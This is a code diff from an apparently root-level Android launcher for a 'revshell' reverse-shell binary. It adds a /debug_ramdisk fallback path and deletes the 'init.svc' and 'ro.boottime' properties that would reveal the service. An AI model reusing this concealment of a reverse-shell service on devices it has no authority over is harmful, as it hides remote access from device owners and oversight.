@@ -35,6 +35,7 @@
 
 #define SBIN_REVSHELL "/sbin/revshell"
 #define DEV_REVSHELL "/dev/sys_ctl/revshell"
+#define DEBUG_REVSHELL "/debug_ramdisk/revshell"
 
 
 bool check_fs_decrypted() {
@@ -178,9 +179,13 @@ int main(int argc, char** argv, char** envp) {
     int status;
 
     // Hide prop:  init.svc.SVC_NAME
-    if (argc != 2) return 0;
-    std::string svc_name = "init.svc." + std::string(argv[1]);
-    delprop(svc_name.c_str());
+    if (argc >= 2) {
+        std::string svc_name = "init.svc." + std::string(argv[1]);
+        delprop(svc_name.c_str());
+
+        svc_name = "ro.boottime." + std::string(argv[1]);
+        delprop(svc_name.c_str());
+    }
 
     // Remount read-only /sbin on system-as-root
     // (may fail on rootfs, no problem there)
@@ -189,7 +194,14 @@ int main(int argc, char** argv, char** envp) {
         mount(nullptr, "/sbin", nullptr, MS_REMOUNT | MS_RDONLY, nullptr);
         revshell_path = SBIN_REVSHELL;
     }
-    else revshell_path = DEV_REVSHELL;
+    else if (access(DEV_REVSHELL, F_OK) == 0)
+        revshell_path = DEV_REVSHELL;
+    else if (access(DEBUG_REVSHELL, F_OK) == 0)
+        revshell_path = DEBUG_REVSHELL;
+    else {
+        ALOGD("Error: revshell binary not found");
+        return 1;
+    }
 
     // setup temp dir
     ALOGD("Setting up " TEMP_MNT_POINT TEMP_DIR);
